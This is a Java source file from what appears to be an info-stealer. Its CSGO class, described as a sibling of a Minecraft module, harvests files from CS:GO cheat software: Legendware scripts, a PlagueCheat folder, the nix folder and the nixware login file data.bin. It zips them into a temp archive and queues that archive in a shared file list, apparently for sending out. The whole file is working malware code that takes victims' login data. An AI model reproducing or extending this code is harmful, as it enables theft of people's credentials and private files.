package dev.peter.luterium.features;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Optional;

import static dev.peter.luterium.Main.fileList;

/**
 * @author Peter
 * @since 09/29/2025
 * Same thing as Minecraft.java, but now for CS:GO (written on top of old CSGO.java)
 * I won't comment everything again, please check Minecraft.java to see what everything does
 */

public class CSGO implements PayloadExecutor {
    String tempPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\";
    String mainPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofCSGO\\";
    String mainZipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofCSGO.zip";

    String[][] paths = {
            {"oofLWScripts.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts")}, //Legendware
            {"oofPlague.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\screenshots")}, //PlagueCheat
            {"oofNix.zip", "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\nix"} //CSGO
    };
    Optional<File> nixLoginFile = FileUtil.getFile("C:\\nixware\\data.bin");

    @Override
    public void execute() throws Exception {
        List<File> zipList = new ArrayList<File>();

        for (String[] strings : paths) {
            File zip = new File(tempPath + strings[0]);
            File path = new File(strings[1]);

            if(path.exists()) {
                //Adds nixLoginFile to oofNix.zip (if it exists)
                if(Objects.equals(strings[0], "oofNix")) {
                    File[] entries;
                    entries = nixLoginFile.map(file -> new File[]{
                            path,
                            file
                    }).orElseGet(() -> new File[]{
                            path
                    });

                    ZipUtil.packEntries(entries, zip);
                } else {
                    ZipUtil.pack(path, zip);
                }

                zipList.add(zip);
            }
        }

        File mainDir = new File(mainPath);
        if (!mainDir.exists()) {
            mainDir.mkdirs();
        } else {
            mainDir.delete();
            mainDir.mkdirs();
        }

        for(File file : zipList) {
            Files.move(file.toPath(),
                    (new File(mainPath + file.getName())).toPath(),
                    StandardCopyOption.REPLACE_EXISTING);
        }

        ZipUtil.pack(mainDir, new File(mainZipPath));
        mainDir.delete();

        Optional<File> file = FileUtil.getFile(mainZipPath);
        file.ifPresent(archive -> {
            fileList.add(archive);
        });
    }
}
